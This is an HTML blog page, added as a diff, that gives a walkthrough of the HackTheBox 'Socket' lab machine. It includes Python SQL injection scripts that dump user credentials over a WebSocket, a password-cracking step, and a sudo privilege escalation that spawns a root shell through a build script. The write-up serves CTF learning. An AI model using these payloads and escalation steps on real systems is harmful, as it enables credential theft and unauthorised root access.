@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Socket</title>
+
+  <meta name="description" content="HackTheBox Socket Writeup By Md Amiruddin">
+  <meta name="author" content="Md Amiruddin">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Socket">
+  <meta name="twitter:description" content="HackTheBox Socket Writeup By Md Amiruddin">
+  <meta name="twitter:creator" content="Md Amiruddin">  
+  <meta name="twitter:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/d4a19b63d083873e115f15b642c52981.png" />
+
+  <meta property="og:site_name" content="Md Amiruddin" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Socket">
+  <meta property="og:description" content="HackTheBox Socket Writeup By Md Amiruddin">
+  <meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/d4a19b63d083873e115f15b642c52981.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://tryhackme-images.s3.amazonaws.com/room-icons/d4a19b63d083873e115f15b642c52981.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup TryHackme Sighunt" href="/feed.xml">
+</head>
+
+
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.gif)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="Md Amiruddin">
+          <h1 class="panel-cover__title panel-title scale-up-center">Md Amiruddin</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">This Site Contains CTFs Writeup</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="Md Amiruddin" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+             <li class="navigation__item grow">
+                <a href="https://github.com/MdAmiruddin" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/mdamiruddin" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+              
+              <li class="navigation__item grow">
+                <a href="https://mdamiruddin.medium.com" title="Medium" target="_blank">
+                  <i class="icon icon-social-medium"></i>
+                  <span class="label">Medium</span>
+                </a>
+              </li>
+              
+              <li class="navigation__item grow">
+                <a href="mailto:sample@gmail.com" title="Email" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+    
+  </div>
+
+  <header class="post-header slide-top">
+   
+    <head>
+<style>
+body {
+  background-color: #000000;
+  color: #FFFFFF;
+  font-family: Calibri, Sans Serif;
+}
+
+.darkMode{
+  background-color: #ffffff;
+  color: #000000;
+}
+
+</style>
+</head>
+<body>
+<button id="darkModeToggle">☀️ </button>
+
+
+<script>
+  const darkModeToggle = document.querySelector('#darkModeToggle');
+  
+  darkModeToggle.addEventListener('click', () => {
+    document.body.classList.toggle('darkMode')
+  })
+  
+</script>
+
+</body>
+    <br>
+    <picture><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/d4a19b63d083873e115f15b642c52981.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+   
+  </header>
+
+
+<br>
+<br>          
+<h1 id="hack-the-box-socket-writeup-walkthrough">Hack The Box  Socket Writeup/Walkthrough</h1>
+<p>This is a writeup/walkthrough of Hack the Box machine “Socket” by Md Amiruddin</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/0*ecgN4Hf7a89a1sZ-.png" alt=""></p>
+<p><strong>Machine Link</strong>  :<a href="https://app.hackthebox.com/machines/Socket">https://app.hackthebox.com/machines/Socket</a></p>
+<p><strong>Machine IP</strong>  : 10.10.11.206</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/0*ZzbP_vYOJl6pJajC.png" alt=""></p>
+<h1 id="enumeration-">Enumeration:</h1>
+<p><strong>Nmap Result</strong></p>
+<p>sudo nmap -sV -sC -A 10.10.11.206</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/0*17K1xym-FAzLGeA0.png" alt=""></p>
+<p><strong>Scan Result:</strong></p>
+<p>22 tcp open port for ssh</p>
+<p>80 tcp open port for http</p>
+<p>Websocket on port 5789</p>
+<p>let’s do a vulnerability scan of websocket in port 5789 with  <a href="https://github.com/PalindromeLabs/STEWS">STEWS</a></p>
+<h5 id="github-palindromelabs-stews-a-security-tool-for-enumerating-websockets">GitHub - PalindromeLabs/STEWS: A Security Tool for Enumerating WebSockets</h5>
+<p>python3 STEWS-vuln-detect.py -1 -n -u 10.10.11.206:5789</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/0*7urD5zisq7WEzgUu.png" alt=""></p>
+<p>We came to know about a vulnerable url which is  <strong>ws://qreader.htb:5789</strong></p>
+<p><strong>Browsing Website :</strong></p>
+<p>Now add this  <strong><em>10.10.11.206 qreader.htb</em></strong>  to /etc/hosts</p>
+<p>Now access the website  <a href="http://qreader.htb/"><strong>http://qreader.htb/</strong></a>  through your browser.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/0*V9aaoZeMiDAzvotg.png" alt=""></p>
+<p>Through this website we can generate and scan a qr code.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/0*pou0qWZvghBwUIOm.png" alt=""></p>
+<p>Also we can download the software for windows and linux so, let’s download the .exe file and decompile it using  <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a>.</p>
+<h4 id="github-extremecoders-re-pyinstxtractor-pyinstaller-extractor">GitHub - extremecoders-re/pyinstxtractor: PyInstaller Extractor</h4>
+<blockquote>
+<p>python3 pyinstxtractor.py qreader.exe</p>
+</blockquote>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/0*4NGSjNybLp9Qam1C.png" alt=""></p>
+<p>Now go to extracted folder &amp; and examine the qreader.pyc file.</p>
+<p>pip3 install uncompyle6  </p>
+<p>uncompyle6 qreader.pyc &gt; qreader.py</p>
+<p>After analyzing the qreader.py file we found the vulnerability as you can see below.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/0*xCCvX9ZxTyzgUTM9.png" alt=""></p>
+<p>Let’s make a python script to exploit the SQL Injection found in the above source code.</p>
+<p>from websocket import create_connection<br>import json<br>ws_host = &#39;ws://qreader.htb:5789&#39;<br>VERSION = &#39;0.0.3&quot; UNION SELECT group_concat(answer),&quot;2&quot;,&quot;3&quot;,&quot;4&quot; FROM answers;-- -&#39;<br>ws = create_connection(ws_host + &#39;/version&#39;)<br>ws.send(json.dumps({&#39;version&#39;: VERSION}))<br>result = ws.recv()<br>print(result)<br>ws.close()</p>
+<p>Above code will print all the user as shown below.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/0*hB3PqA9MMkATMzL0.png" alt=""></p>
+<p>Lets write a code to print password of user.</p>
+<p>from websocket import create_connection<br>import json<br>ws_host = &#39;ws://qreader.htb:5789&#39;<br>VERSION = &#39;0.0.3&quot; UNION SELECT username,password,&quot;3&quot;,&quot;4&quot; from users;-- -&#39;<br>ws = create_connection(ws_host + &#39;/version&#39;)<br>ws.send(json.dumps({&#39;version&#39;: VERSION}))<br>result = ws.recv()<br>print(result)<br>ws.close()</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/0*RD0P0UrNL-iKcntz.png" alt=""></p>
+<p>As you can see we got our password and we can decrypt this at crackstation.net website as shown below.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/0*-47M9HO84ouiYjJI.png" alt=""></p>
+<p>Now it time to login via ssh.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/0*XgbJsqhVEx77Hskd.png" alt=""></p>
+<p>Now copy your user flag.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:471/0*IuuKYQ8RkWdKrI_s.png" alt=""></p>
+<p>Running  <strong>sudo -l</strong> to see any command which we can run as root without password.</p>
+<p>build-installer.sh can be run as root without password.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/0*4WIcr7_wT1JWZ4g0.png" alt=""></p>
+<p>Command used</p>
+<p>echo &#39;import os;os.system(&quot;/bin/bash&quot;)&#39; &gt; root.spec  </p>
+<p>sudo /usr/local/sbin/build-installer.sh build root.spec</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/0*pzmMd1xHQNkTyuC9.png" alt=""></p>
+<p>As you can see we got our root flag.</p>
+<p><strong>Thankyou For Reading.</strong></p>
+
+
+
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - Md Amiruddin</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
